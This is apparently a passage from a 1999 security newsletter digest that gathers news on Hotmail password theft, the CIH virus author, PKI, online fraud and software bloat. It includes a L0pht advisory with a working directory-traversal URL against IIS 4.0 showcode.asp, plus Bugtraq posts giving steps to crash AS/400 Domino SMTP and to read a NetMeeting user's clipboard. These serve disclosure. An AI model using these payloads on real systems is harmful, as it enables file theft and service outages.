      PKI solutions combine encryption, digital certificates and other technologies
      to authenticate a user's identity and to ensure that data and transactions are
      not tampered with during transmission over the Internet. DOD announced
      plans last month to use PKI solutions to secure both internal and external
      communications.

      But PKI "doesn't solve anything itself," said Hale. Rather, because many of
      today's commercial security products "are not that good," DOD needs to
      devise a common set of policies governing both access and standards, he
      said.

      In addition, Hale said the department needs to address the "hodgepodge" of
      Internet connections and protection policies that make up the DOD security
      architecture and process, which he described as "just a mess." As a solution,
      Hale recommended formulating a set of standard policies that spell out what
      type of information will be allowed to enter and leave DOD networks.

      Hale said the modern way of dealing with adversaries, whether cyber-based
      or otherwise, remains "essentially unchanged" since the construction of the
      Great Wall of China, when nations erected stone embankments to protect
      their citizens against invading forces. "I do not think this can continue if we're
      really going to be serious about fighting wars using [COTS systems]," he said.

      Army to offer 'information survival' training

      BY DANIEL VERTON (dan_verton@fcw.com)

      SALT LAKE CITY -- The Army this fall plans to offer an online
      graduate-level training course on information systems survivability, teaching
      engineers to develop systems capable of surviving any kind of technical glitch
      and network attack.

      The new 14-week Infosurv course will be offered through the University of
      Maryland as an online, distance-learning initiative sponsored by the Army
      Research Laboratory in Adelphi, Md. During the course, students with a basic
      engineering background will build on their education with instruction on
      reliability, security and performance risks that must be addressed early in the
      life cycle of an information system.

      According to Lt. Col. Paul Walczak, senior computer scientist at the Army
      Research Laboratory, the concept of Infosurv has been around for about 10
      years, growing out of research conducted at the Army Research Laboratory.
      Survivability, Walczak said, can best be defined as a system's ability to
      withstand hardware faults, software flaws, network attacks by hackers and
      electromagnetic interference. When one of these types of failures brings a
      system or a portion of a system down, the rest of the information infrastructure
      must be capable of operating, he said.

      "This is a serious attempt by the Army Research Lab to institutionalize the
      concept," Walczak said. Until now, reliability, survivability and security have
      been features that systems developers have "bolted on" after the development
      process started, he said. The goal is to build these requirements into the
      system design before development work begins, he said.

      The Army plans to transmit live courses each Thursday from a lecture room
      on the College Park, Md., campus to as many as 16 satellite locations. "We
      plan to beam this course out to as many sites as are interested in it," said
      Walczak, who noted that the University of Tennessee, Pennsylvania State
      University and Harvard University also have expressed interest in taking part
      in future courses.

      Peter Neumann, principal scientist at the Computer Science Laboratory at
      SRI International and the principal investigator for Infosurv research, will be
      the primary instructor for the course. The course will act as the core course in
      a new four-course masters-level certificate program in survivable systems, and
      it also can be used as credit toward a regular degree program.

      TAKEDOWN, produced by Millenium Films and Dimension Films and which will be released by Miramax.
      TAKEDOWN, directed by Joe Chappelle (PHANTOMS) is based on the true story of the trackdown, and
      eventual arrest of superhacker Kevin Mitnick. Played by Skeet Ulrich, Mitnick is a master at breaking into
      computer networks and stealing files. He believes that the First Amendment should cover all information and that
      anyone with a modem is entitled to free access. In the course of his hacking, he steals files from expert computer
      security consultant Tsutomoto Shimomura (Russell Wong). Included in the files is a super worm/virus called
      "Contempt", which enables the user to breakdown the security programs and firewalls of any computer network.
      The story becomes a cross country race against time and a battle of wits between Mitnick, trying to crack
      Contempt's code, and Shimomura and the FBI's efforts to track Mitnick down and stop him before he can upload
      the program to the internet. 

         Also in the cast is Angie Featherstone as Shimomura's computer savvy girlfriend, and Donal Logue as Mitnick's
      friend and ally Alex Lowe. This could be the film that finally does away with the dweeb image of hackers and
      shows the computer geek as a freedom fighting hero and protector of our liberties. Hey, a couple of these
      characters actually have flesh and blood girlfriends! 

         Well, it's time to chase some cats and scare the postman, so until next time, Woof!

       A little late but the Internet Security Advisors Group has
       found in a recent security probe that free e-mail
       services such as Microsoft's Hotmail, YahooMail and
       Excite Mail failed to provide a basic security. President
       of ISAG, Ira Winkler, says that this lack of features
       makes it possible for "Hackers" to read your email.

      Free E-mail Services Are Vulnerable To Hackers 

      Free Web-based e-mail services are vulnerable to hackers, according to an 
      analysis by the Internet Security Advisors Group, a consultancy in Severna
      Park, Maryland. In its security probe, ISAG focused on the three biggest and
      most firmly established Web-based free e-mail services: Microsoft's Hotmail, 
      YahooMail and Excite Mail. It found that all three failed to provide a basic 
      security feature that helps keep hackers out. 

      The major mistake made by all the service providers was to allow users an 
      unlimited number of attempts to log on, rather than locking them out after a
      couple of attempts if they got the password wrong. This, says Ira Winkler, 
      president of ISAG, makes it possible for hackers to guess a password by
      brute force-using what is known as an automated dictionary attack, which tries
      vast numbers of different passwords until the correct one is found. 

      This, Winkler says, is a basic information security issue the service providers
      should have got right. In addition, ISAG found that many Web-based e-mail systems
      also fail to encrypt their passwords when they are sent over the Net, making 
      them easy prey for hackers to intercept. Some hackers collect passwords, logging 
      into e-mail accounts and sending bogus messages. 

      Last week, Hotmail tightened its security in response to ISAG's findings. Its 
      log-in protocol now incorporates a slight delay when the password is entered. 
      For each wrong attempt the delay increases, making any automated attack take an
      unfeasibly long time. "There's no impact on members who log in successfully," says
      Laura Norman, a project manager at Hotmail, "but this should deter potential 
      dictionary attacks." Yahoo has also made changes to its password security system and
      Excite is believed to be considering the matter.

       Online Shoppers Willing to Accept Security Risk 
       10.29 a.m. ET (1429 GMT) May 5, 1999 
       By Andrew Hay  REUTERS
       
       
       NEW YORK  Sean Michael says he had his credit card number stolen online
       and used in a fraudulent shopping spree, but it hasn't stopped him from trawling
       the Web in search of bargains.
       
       "The prices are so good, it's worth the risk," Michael, 25, said Monday as he
       took a break outside the Manhattan skyscraper where he works as a financial
       adviser.
       
       Michael is among online shoppers willing to face certain security risks to obtain
       products ranging from dress shirts to airline tickets at steep discounts.
       
       The perennial issue of e-commerce security sprang up again recently with reports
       that a 13-year-old boy had placed $3.1 million in bids on merchandise advertised
       on the Internet auction site eBay, including $1.2 million for a medical office in
       Florida. All the bids were fictitious.
       
       Industry analysts said online shopping risks vary greatly, often based on the size
       of the retailer, but in general typing your credit card number while online is no
       more dangerous than giving it to a waiter or a telephone operator.
       
       Michael's credit card problems followed one of his first online buys seven to eight
       months ago. Someone used his card for a number of fraudulent purchases after he
       ordered some dress shirts and a suit from Paul Fredrick, an established direct
       seller of men's apparel, which has sold its wares online since 1990.
       
       Paul Fredrick spokesman Jeff Giesener said the Fleetwood, Pa., company has
       strong encryption, or scrambling, software installed on its computers and he was
       not aware of any reported cases of credit card fraud among its 30,000 online
       customers.
       
       "I don't know why he's linking it to us; if you go to a restaurant, and a receipt
       goes in the garbage, it can be used fraudulently," Giesener said. "I think it's riskier
       offline."
       
       Michael said he was not held liable for any of the fraudulent buys and continues to
       be a regular customer at http://www.paulfredrick.com.
       
       Recent online fraud and hacker attacks show both leading Internet companies
       and small startups can fall prey to security breaches. In a much-publicized case,
       bidders at eBay Inc. and another online auction house, Up4Sale, fell victim to
       fraud when goods they bought were not delivered.
       
       Gartner Group analyst Chuck Shih said statistics generated by Visa indicated
       credit card fraud was as likely to occur online as offline.
       
       But slip-ups are most likely to take place at smaller, newer Web retail
       establishments racing to the Web, Shih said. In their rush to get online and
       establish their brand, these outfits often sidestep security issues in a bid to be first
       to market, he said.
       
       Credit card fraud remains so relatively rare that many companies find it easier to
       reimburse customers than to go through costly investigations to determine whether
       the fraud originated from their site, Donna Hoffmann, an Internet specialist at
       Vanderbilt University in Nashville, Tenn., said in a telephone interview.
       
       "When someone gets hurt seriously enough, then people are going to take a step
       back and look at security," Hoffman said in a telephone interview. "Right now, the
       security is not that sophisticated."
       
       Often, security breaches are merely the result of savvy hackers capitalizing on
       human errors.
       
       Improperly installed and maintained security software can put any online retailer
       at risk of credit card fraud. Recent cases have shown that so-called "shopping
       cart" technology used by some Web retailers could expose credit card numbers
       and other data to the public if not installed properly, Shih said.
       
       Hoffmann said smaller operations often lack the financial and human resources to
       monitor their security software continually.
       
       One way to increase security is to make customers go through a longer series of
       mouse clicks. But retailers hate sacrificing speed and giving up customers who
       find ordering too slow or boring and may think twice about impulse buys.
       
       Ultimately, combating fraud lies in the hands of the cyber-consumer.
       
       Online shoppers can use encryption technology, which scrambles data sent over
       the Internet, to protect credit card numbers in online transactions or can call
       1-800 numbers to give the credit card number to a person after seeing something
       online.
       
       Bob, the 35-year-old founder of a Seattle Internet company, who asked that his
       last name not be used, said he takes such security steps when he can but that it
       doesn't keep him from buying when they're not available.
       
       "It's a trade-off between how much you'll save versus security," said Bob, who
       has used the Web to get discounts of up to 50 percent on plane tickets. "I've had
       no problems so far."

       Hotmail Passwords Stolen 

       contributed by Laup 
       A java script password-stealing application is known to
       have snared at least 10 users passwords and is the first
       time such a hole has been known to have been used to
       actually steal passwords. This particular hole involved
       an emailed attachment with a Web page link. A script
       running on the attacker's Web page then negotiated a
       request to change the password with the Hotmail
       server, locking the user out of the account and giving
       the attacker access to it.

       Malicious hacker steals Hotmail passwords 
       By Paul Festa

       Hotmail password-stealing exploits are no longer the sole province of bug-hunting, ethical 
       hackers.
       
       Microsoft's MSN Hotmail said it has implemented a patch to thwart a JavaScript exploit that
       snared the passwords of about ten users. Although Hotmail has faced numerous similar exploits
       in the past, they were merely demonstrations crafted by security-minded programmers anxious to 
       expose security holes before they were exploited for real.
       
       This one appears to be the first known instance in which users actually lost their Hotmail 
       passwords.
       
       "We're not aware of any [previous] passwords successfully stolen in this type of exploit," said
       Hotmail product manager Laura Norman.
       
       The Trojan horse password-stealing scheme involved an emailed attachment with a Web page link. 
       A script running on the attacker's Web page then negotiated a request to change the password with
       the Hotmail server, locking the user out of the account and giving the attacker access to it.
       
       Hotmail was not more specific on the mechanics of the script or how the hole was patched. Norman 
       did say Hotmail would step up its education efforts to users regarding the safety of opening 
       attachments.
       
       "We are increasing our messaging to users about only opening attachments from trusted sources," she
        said.
       
       Trojan horses consist of executable content that acts in a way other than the user expects it to. 
       JavaScript is a scripting language developed by Netscape Communications for authoring Web site actions
       that do not require user interaction; pop-up windows, for instance, are commonly authored with JavaScript.
       JavaScript is unrelated to Java, Sun Microsystems' platform-independent computer programming language.
       
       JavaScript has been the tool of choice for numerous bug hunters and hackers because of its ability to 
       carry out actions on the user's computer without his or her consent or knowledge. For this reason, many
       security-conscious Web surfers disable the technology when surfing the Web.
       
       The perpetrator's Web site was hosted by free home page provider Tripod, which is owned by Lycos. Norman
       said that Tripod was "very cooperative," but she declined to state whether the firms were taking action 
       against the password thief.

       Microsoft IIS 4.0 Vulnerability Found 


       contributed by Weld Pond 
       L0pht Heavy Industries has found a problem with IIS 4.0
       and the ASP sample file, showcode.asp. This sample file
       is designed to view the contents of the sample .asp files
       that come with the software. Unfortunatley due to
       weak security this file can allow any remote user to
       view any text file on the web server. This has the
       potential to put transaction logs, credit card numbers,
       and other customer information from e-commerace
       servers at risk

               L0pht Security Advisory
       
       -------------
       URL Origin:    http://www.l0pht.com/advisories.html 
       Release Date:  May 7th, 1999 
       Application:   Microsoft IIS 4.0 Web Server
       Severity:      Web users can view ASP source code and other sensitive
                      files on the web server 
       Author:        weld@l0pht.com 
       Operating Sys: Microsoft NT Server 4.0
       --------------
       
       I. Description
       
       Internet Information Server (IIS) 4.0 ships with a set of sample files
       to help web developers learn about Active Server Pages (ASP).  One of
       these sample files, showcode.asp, is designed to view the source
       code of the sample applications via a web browser. The showcode.asp
       file does inadequate security checking and allows anyone with a web
       browser to view the contents of any text file on the web server.  This
       includes files that are outside of the document root of the web
       server.
       
       Many ecommerce web servers store transaction logs and other customer 
       information such as credit card numbers, shipping addresses, and
       purchase information in text files on the web server.  This is the
       type of data that could be accessed with this vulnerability.
       
       The L0pht would like to thank Parcens for doing the initial research on
       this problem. 
       
       II. Details
       
       The showcode.asp file is installed by default at the URL:
       
       http://www.someserver.com/msadc/Samples/SELECTOR/showcode.asp
       
       It takes 1 argument in the URL, which is the file to view. The format of
       this argument is:
       
       source=/path/filename
       
       So to view the contents of the showcode.asp file itself the URL would be:
       
       http://www.someserver.com/msadc/Samples/SELECTOR/showcode.asp?source=/msadc/Samples/SELECTOR/showcode.asp
       
       This looks like a fairly dangerous sample file. It can view the contents
       of files on the system. The author of the ASP file added a security check
       to only allow the viewing of the sample files which were in the '/msadc'
       directory on the system. The problem is the security check does not test
       for the '..' characters within the URL.  The only checking done is if the
       URL contains the string '/msadc/'.  This allows URLs to be created that
       view, not only files outside of the samples directory, but files anywhere
       on the entire file system that the web server's document root is on.
       
       For example, a URL that will view the contents of the boot.ini file, which 
       is in the root directory of an NT system is:
       
       http://www.someserver.com/msadc/Samples/SELECTOR/showcode.asp?source=/msadc/Samples/../../../../../boot.ini
       
       This URL requires that IIS 4.0 was installed in its default location.
       
       
       III. Solution
       
       For production servers, sample files should never be installed so delete
       the entire /msadc/samples directory.  If you must have the showcode.asp
       capability on development servers the showcode.asp file should be modified
       to test for URLs with '..' in them and deny those requests.

 31.0  [ISN] More on CIH , college student receives demerit but no other punishment
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
      Forwarded From: 7Pillars Partners <partners@sirius.infonex.com>


      Taiwan college identifies computer virus author 
                                       
      TAIPEI, Taiwan (AP) - A former computer engineering student was
      identified by his college today as the author of the Chernobyl virus
      - the menace that caused hundreds of thousands of computer meltdowns
      around the world this week. 
      
      The Tatung Institute of Technology had punished Chen Ing-hau last
      April when the virus he wrote as a student began to cause damage in
      an inter-college data system, according to Lee Chee-chen, the
      institute's dean of student affairs.
      
      Chen, who was a senior at the time, was given a demerit but not
      expelled.
      
      The Chernobyl virus is known in Taiwan as the CIH, using Chen's
      initials.
      
      The college did not mete out a more severe punishment because Chen
      had warned fellow students not to spread the virus, Lee said. Chen
      did not come up with an anti-virus program, Lee said.
      
      Lee said he was not sure how the virus ended up causing so much
      destruction a year later.
      
      Chen graduated from the college last summer and now is serving
      Taiwan's two-year compulsory military service, Lee said.
      
      Officials of the Bureau of Criminal Investigation said they would
      seek permission to question Chen.
      
      The unusually destructive virus - timed to strike on April 26, the
      13th anniversary of the Chernobyl nuclear disaster - tries to erase a
      computer's hard drive and write gibberish into its system settings to
      prevent the machine from being restarted.
      
      Turkey and South Korea each reported 300,000 computers damaged
      Monday, and there were more elsewhere in Asia and the Middle East.
      Fewer than 10,000 of the 50 million computers in the United States
      were affected.

 32.0  [ISN] Taiwan virus suspect free on lack of victims
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       http://www.cnn.com/TECH/computing/9904/30/virus.computer.reut/index.html
       
       
       Taiwan virus suspect free on lack of victims 
       April 30, 1999
       Web posted at: 11:59 a.m. EDT (1559 GMT)
       
       
       TAIPEI, Taiwan (Reuters) -- Investigators said on Friday a Taiwan hacker
       admitted creating the Chernobyl virus that ravaged computers worldwide but
       said a lack of any local plaintiffs made it difficult to charge him. 
       
       
       Police said Chen Ing-hau, a 24-year-old information engineer now serving
       mandatory military service, was questioned but not charged and the probe
       hinged on finding victims. 
       
       
       "He's not a criminal here as long as no one registers a complaint," a
       Taipei police spokeswoman said. 
       
       
       "All we know about problems with the virus is what we've seen in foreign
       news reports." 
       
       
       Chen's rogue program hit hardest in countries with weak anti-virus
       defenses, gumming up hundreds of thousands of computers in South Korea,
       Turkey and China and thousands in India, Bangladesh, the Mideast and
       elsewhere. 
       
       
       Police said no infections had been reported in Taiwan. 
       
       
       Chen was questioned on suspicion of intentionally spreading a computer
       virus, a crime that carries a possible three-year prison term, and could
       be charged if victims come forth. 
       
       
       A bashful Chen, in brief comments after he was released, expressed remorse
       and offered to help victims remove the virus from their computers. 
       
       
       Authorities said Chen created the virus while studying at Tatung Institute
       of Technology, which had disciplined him a year ago after learning about
       the computer program, and did not pursue the matter further with
       authorities. 
       
       
       Dubbed Chernobyl because it strikes on anniversaries of the April 26,
       1986, Soviet nuclear disaster, the virus is known to experts as CIH --
       which Chen acknowledged were his initials. 
       
       
       Chernobyl and other CIH variants are among the most damaging viruses of
       recent years, less widespread than the e-mail replicator virus "Melissa" 
       that swamped Internet servers around the world in April but far more
       vicious. 
       
       
       Chernobyl/CIH employs a "spacefilling" technique that clogs up a
       computer's hard-disk storage system, crashing most systems and in many
       cases making restart impossible. 
       
       
       Western virus experts first traced Chernobyl/CIH to Taiwan in June 1998
       and said it had spread worldwide via the Internet and other networks
       within a week. 
       
       
       Chernobyl's virulence and Taiwan's seemingly lenient handling of its
       author have kindled a debate about how the world should combat viruses. 
       
       
       In the United States, where the Melissa virus's spewing of duplicate
       e-mail messages forced many firms to shut down their overtaxed computer
       networks, alleged author David Smith faces the possibility of 40 years in
       prison if convicted. 
       
       
       ZDNet writer Robert Lemos, in an Internet dispatch, said Taiwan's Chen
       "was not prosecuted, but merely reprimanded and given a demerit" by his
       school. 
       
       
       "The immense differences in punishment illustrate a large rift in
       perceptions over the seriousness of computer viruses," Lemos wrote, adding
       that while "Melissa was essentially benign, CIH was deadly to some
       computers."

 34.0  Microsoft Netmeeting Vulnerabilities
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Date: Tue, 4 May 1999 13:12:09 -0300
       From: Wanderley J. Abreu Junior <storm@UNIKEY.COM.BR>
       To: BUGTRAQ@netspace.org
       Subject: Microsoft Netmeeting Hole
       
                           Since I hadn't any response from Microsoft and a formal
       response from CERT i'm putting it here hopping for a helping hand on this
       problem.
       
       
       Version 1.0
       October 1996
          CERT(sm) Coordination Center
         Product Vulnerability Reporting Form
       
           If you know of a vulnerability in a product, please complete
           this form and return it to cert@cert.org.  We aren't able to
           acknowledge each report we receive; however, if we have additional
           questions, we will contact you for further information.
       
            We prefer that any vulnerability information you
                 send to us be encrypted. We can support a shared DES
          key or PGP. Contact the CERT staff for more information.
          The CERT PGP public key is available in

           Thanks, we appreciate your taking the time to report this
           vulnerability.
       
       Please describe the vulnerability.
       - ---------------------------------
       
       What is the impact of this vulnerability?
       - ----------------------------------------
        (For example: local user can gain root/privileged access, intruders
         can create root-owned files, denial of service attack,  etc.)
       
          a) What is the specific impact: Users running MS NetMeeting Version 2.1
       (The one that comes
             with windows 98) software in a conference can copy/paste the remote
       clipboard area.
       
          b) How would you envision it being used in an attack scenario:
              With the chat windows OPENED just do a CTRL-C in the box where you
              write with nothing in your box and nothing selected at all. then, you
       can get
              the entire clipboard from the other user in the conference, of
       course,
              if there's something in his Clipboard (ASCII, Bin, etc).
       
       
       To your knowledge is the vulnerability currently being exploited?
       - ----------------------------------------------------------------
        [no]
       
       If there is an exploitation script available, please include it here.
       - --------------------------------------------------------------------
       
       Do you know what systems and/or configurations are vulnerable?
       - -------------------------------------------------------------
        [yes]  (If yes, please list them below)
       
        System  : Windows 95, 98 and NT
        OS version : All Versions
        Verified/Guessed: Guessed
       
       Are you aware of any workarounds and/or fixes for this vulnerability?
       - --------------------------------------------------------------------
        [yes] (If you have a workaround or are aware of patches
              please include the information here.)
       
       I'm using PGP to encrypt the clipboard area.
       
       OTHER INFORMATION
       ===========================================================================
       Is there anything else you would like to tell us? Please, send me some
       feedback abou this bug
       i'm working on a solution but seems NetMeeting to use some sort of Common
       Clipboard to build all
       the share enviroments. If you ever heard abou this bug, please also let me
       know. Thank you.

 35.0  IBM AS400+Domino vulnerability
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Date: Tue, 4 May 1999 08:53:14 +0200

       To: BUGTRAQ@netspace.org
       Subject: AS/400
       
       Hello all.
       
       I played around with smtp on a as/400+domino machine and found two
       obvious bugs, then notified IBM, revieved a ptf, then posted here.
       
       1:  telnet (host) 25, then start feeding chars. After about 200-300
       chars the smtp-subsystem will die, needing to be restarted.
       
       2:  change your replyto-address and fromaddress to an non-existing
       user/domain then mail to an non-existing user on the 400/domino. This
       will cause the mail to loop endlessly between the smtp-subsystem and the
       domino subsystem.
       
       This is for general knowledge only, trying to "force" people with
       400/domino to react and secure their machines.
       
       Sincerely,
       ---

       Yeah, i found this a while back on non domino smtp daemons on as400's also.
       it's a somewhat simple solution to fix (just turn the SMTP service back
       on), but SMTP can be shut off across the network.  i know this worked on
       as400 3.X, i haven't had a chance to test on any of the domino types or the
       4.X OS levels

       This is good known bug which is not related to AS/400 at all.
       This causes to die only Lotus Domino 4.6.1.
       I've tried to kill our Lotus Domino 4.6.4 and it still alive ~80)
       
       As for SMTP and Lotus Notes/Domino this is a big problem for it's users
       because there no any anti-spam protection like in Sendmail.
       Now we are playing with 5th Lotus Domino and there are all this bugs fixed
       and anti-spam implemented ~80)

 38.0  The BloatWare Debate
       ~~~~~~~~~~~~~~~~~~~~
       
       Date: Sun, 02 May 1999 16:12:13 +0000
       >From: main@radsoft.net (RA Downes)
       Subject: Re: Bloatware Debate (Downes, RISKS-20.35)
       
       A certain "Johnny" has written to me from Microsoft because of my posting in
       RISKS-20.35 about MS bloat. The tone was a thinly disguised threat. In his
       opening, "Johnny" stated that the "bloat" of MS RegClean was due no doubt to
       having static links. Discussing the sweeping ramifications of such a
       statement is unnecessary here. The mind boggles, it is sufficient to
       state. The MSVC runtime is a mere 250,000 bytes and in fact is not
       statically linked anyway to MS RegClean, AFAIK [as far as I know]. MS
       RegClean is an MFC app and will by default use the dynamically linked MFC
       libraries. And even if its static code links were an overhead here they
       would add but a small fraction of the total bloat, say 40KB at most.
       
       For whatever reason, I decided to download the latest version of MS RegClean
       >from BHS again and pluck it apart. This is what I found. I have tried - and
       it has been difficult - to keep subjective comments out of this report.
       
       Current Status of RegClean Version 4.1a Build 7364.1
       ====================================================
       
       Image Size (Unzipped and ready to run): 837,632 bytes (818KB)
       =============================================================
       (Subjective comment removed.)
       
       Import Tables
       =============
       The import section in the PE header. This gives an indication of just
       how (in)effective the use of Bjarne's C++ has been. In this case, the
       verdict is: "pretty horrible". A walloping 7,680 bytes are used for the
       names of the relocatable Win32 imports. These are the actual names of
       the functions (supposedly) called. MS RegClean does not call most of
       these functions - they remain because an MFC template was originally
       used, most likely borrowed from another application, and it was never
       "cleaned". This is corroborated by what is found among the "Windows
       resources": over half a dozen standard menus, assorted graphic images,
       print preview resources, etc. that have nothing to do with the
       application at hand.
       
       Resources
       =========
       Please understand that resources not only bloat an executable with their
       own size, but with additional reference data, in other words the bloat
       factor of an unused or bad resource is always somewhat larger than the
       size of the bloating resource itself.
       
       Accelerators
       ============
       Sixteen (16) unused accelerators from an MFC template were found: Copy,
       New, Open, Print, Save, Paste, "Old Undo", "Old Cut", Help, Context
       Help, "Old Copy", "Old Insert", Cut, Undo, Page Up, Page Down. MS
       RegClean uses only one accelerator itself, not listed here.
       
       Bitmaps
       =======
       This was a particularly sorry lot. The main bloat here was a splash
       screen bitmap weighing in (no RLE compression of course) at over 150KB.
       Further, Ctl32 static library bitmaps were found, meaning MS RegClean is
       still linking with the old Ctl32v2 static library which was obsolete
       five years ago and which automatically adds another 41KB to the image
       size.
       
       Cursors
       =======
       Six (6) cursors were found, none of which have anything to do with this
       application.
       
       Dialogs
       =======
       A very messy chapter indeed. MS RegClean walks around with eighteen (18)
       hidden dialogs, of which only one or at the most two are ever used. The
       others are just - you took the words out of my mouth - junk. The
       findings (read it and weep):
       
       *) Eleven (11) empty dialogs with the caption "My Page" and the static
       text "Todo", all identical, all empty, and of course all unused. This is
       a wonder in and of itself.
       *) The main "wizard" dialog actually used by the application is left
       with comment fields to help the programmers reference the right controls
       in their code (subjective comment removed).
       *) A "RegClean Options" dialog which AFAIK is never used.
       *) A "New (Resource)" dialog, probably a part of the development
       process, just stuffed in the stomach at sew-up time and left there for
       posterity.
       *) A "Printing in Progress" dialog.
       *) A "Print Preview" control bar dialog.
       
       Icons
       =====
       MS RegClean has three icons, all with images of 48x48 in 256 colors (of
       course). The funniest thing here is that the authors of MS RegClean have
       extracted the default desktop icon from shell32.dll, which is available
       at runtime as a resident resource anyway and at no image bloat overhead
       at all, and included it in toto in their executable.
       
       Menus
       =====
       MS RegClean has eight (8) menus, at least half of these are simply junk
       left around by the MFC template. Another menu indicates that the authors
       of RegClean have in fact worked from an internal Microsoft Registry tool
       - rather bloated in itself it seems.
       
       String Table(s)
       ===============
       Actually it need only be one string table, but Microsoft itself has
       never learned this. The findings here were atrocious. And you must
       remember that strings stored in a string table are stored in Unicode,
       which means that their bloat automatically doubles. Further, MS's way of
       indexing strings in a string table means a 512 byte header block must be
       created for every string grouping, and strings are grouped according to
       the high 12 bits of their numerical identifiers (yes they are 16-bit
       WORD identifiers). Meaning indiscriminate or random numbering of string
       table entries will make an otherwise innocent application literally
       explode.
       
       347 (three hundred forty seven, yep, your video driver is not playing
       tricks on you) string table entries were found in MS RegClean, including
       16 identical string entries with the MS classic "Open this document" as
       well as archaic MFC template toggle keys texts which are not used here
       (or almost anywhere else today). Most of these strings have - of course
       - nothing to do with the application at hand.
       
       Toolbars
       ========
       Toolbars are a funny MS way of looking at glyph bitmaps for use in
       toolbar controls. MS RegClean has two - one which may be used by the
       application, and one which was part of the original MFC template and
       never removed.
       
       Total Accountable Resource Bloat
       ================================
       The total accountable (i.e. what can be directly calculated at this
       stage) resource bloat of MS RegClean 4.1a Build 7364.1 is over 360,000
       bytes (350KB).
       
       Total Accountable Code Bloat
       ============================
       Harder to estimate, but considering that most of the code is never used,
       only part of an MFC template that the authors of MS RegClean lack the
       wherewithal to remove, the original estimate of a total necessary image
       size of 45KB for the entire application must still stand.
       
       In Conclusion
       =============
       Bloat is not a technical issue, but verily a way of thinking, a "state
       of mind". Its cure is a simple refusal to accept, and a well directed,
       resounding "clean up your act and clean up your code!"

       Subject: Re: Bloatware Debate
       
       Bloatware is something we are very sensitized to here. The way we see it,
       there is no excuse, because there is no reason.
       
       I personally accepted Brian W. Kernighan's calculations back in the old days
       about a 10% bloat with C versus assembler because the rewards were tangible
       and far outweighed the bloat: you got largely (according to Steve Johnson
       94%) platform independent code, saving countless man-hours of work.
       
       But ever since the popular inception of MS Windows and furthermore MS's MFC
       things have been way out of control. This is partly due to C++ and partly,
       if not largely, due to MS and their MFC itself. A typical Win16 application
       was 5KB, yet the same skeleton if built with the MFC back then was ten times
       that size. And Bjarne's words echoed in your ear: "C++ produces no
       noticeable overhead versus C." It simply was not so, and never will be so.
       
       With time the MFC overhead has been reduced somewhat, but programmers of
       today, raised on OO and C++ as opposed to what others have gone through,
       are simply not taught to be conservative and minimalistic.
       
       I received a letter yesterday from someone who had been reading the Risks
       Digest, and reported on a party he had attended some years earlier. The
       conversation turned inevitably toward software, and he mentioned that he
       often must really tweak code to get it compact and fast. Another person at
       the party, from you guessed it Redmond Washington, said that was *not* the
       way things were done there; she said that if they ever ran into performance
       problems, they just "threw more hardware at it."
       
       So there are several issues involved all at once, and AFAIK the only way to
       fight this, for stop it we must, is to expose it and make even ordinary end
       users understand what it's all about, and perhaps by a concerted effort we
       can turn back the tide.

 40.0  Cyber-Christ meets Lady Luck.  Winn Schwartau in Las Vegas (DefCon II)
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Snarfed from PacketStorm Security http://www.genocide2600.com/~tattooman/new.shtml
       
               DefCon II: Las Vegas 
               Cyber-Christ meets Lady Luck 
               July 22-24, 1994 
               by Winn Schwartau 
        
        
       Las Vegas connotes radically different images to radically different folks.  The Rat Pack of 
       Sinatra, Dean Martin and Sammy Davis Jr. elicits up the glistening self-indulgent imagery of  
       Vegas'  neon organized crime in the '50's   (Ocean's Eleven displayed only minor hacking skills.) 
        
       Then  there's the daily bus loads of elderly nickel slot  gamblers from  Los Angeles and Palm 
       Springs who have nothing better to  do for  twenty out of twenty four hours each day.  (Their 
       dead  hus bands were golf hacks.)   Midwesterners now throng to the Mississippi River for cheap 
       gambling. 
        
       Recreational vehicles of semi-trailor length from East  Bullock, Montana  and Euclid, Oklahoma 
       and Benign, Ohio clog routes 80  and 40  and 10 to descend with a vengeance upon an asphalt 
       home away from home in  the parking  lot  of Circus Circus.  By cultural demand, every Rv'er 
       worth his  salt  must, at least once in his life,  indulge in the depravity of Glitter Gulch.   
        
       And so they come, compelled by the invisibly insidious derelict attraction of  a desert Mecca 
       whose only purpose in life is to suck the available cash  from addicted visitor's electronic purses of 
       ATM and VISA cards. (Hacker?  Nah . . .) 
        
       Vegas also has the distinction of being home  to the largest of the  largest  conventions  and 
       exhibitions in the world.  Comdex is the world's largest computer convention where 150,000 
       techno- dweebs and silk suited glib techno-marketers display  their  wares to a public who is still  
       paying  off  the 20% per annum debt on  last year's  greatest  new  electronic gismo which  is  now 
       rendered thoroughly obsolete.  And the Vegas Consumer Electronic Show does for consumer 
       electronics what the First Amendment does for  pornography.  (Hackers, are we getting close?) 
        
       In  between,  hundreds  upon hundreds of  small  conferences  and conventions  and  sales 
       meetings and annual excuses for excess all  select  Las Vegas as the ultimate host city.  Whatever 
       you want, no matter how decadent, blasphemous, illegal or immoral, at any hour, is  yours for the 
       asking, if you have cash or a clean  piece of plastic.   
        
       So, it comes as no surprise, that sooner or later, (and it  turns out  to  be sooner) that the hackers 
       of the world,  the  computer hackers, phone phreaks, cyber-spooks, Information Warriors,  data 
       bankers,  Cyber-punks,  Cypher-punks,  eavesdroppers,   chippers, virus writers and perhaps the 
       occasional Cyber Christ again picked Las Vegas as the 1994 site for DefCon II.  
        
       You  see, hackers are like everyone else (sort of) and  so  they, too,  decided  that  their 
       community was also  entitled  to  hold conferences and conventions. 
        
       DefCon (as opposed to Xmas's HoHoCon), is the premier mid-year hacker extravaganza.  
       Indulgence gone wild, Vegas notwithstanding if  previous Cons  are any example; but now put a 
       few  hundred  techno-anarchists  together  in sin city USA, stir in liberal doses  of  illicit 
       controlled pharmaceutical substances, and we have a party that Hunter Thompson would be 
       proud to attend. 
        
       All the while, as this anarchistic renegade regiment marches to the tune of a 24 hour city, they are 
       under complete surveillance of the authorities.  Authorities like the FBI, the Secret Service, 
       telephone security . . . maybe even Interpol.  And how did the "man" arrive in tow behind the 
       techno-slovens that belong behind bars? 
        
       They were invited. 
        
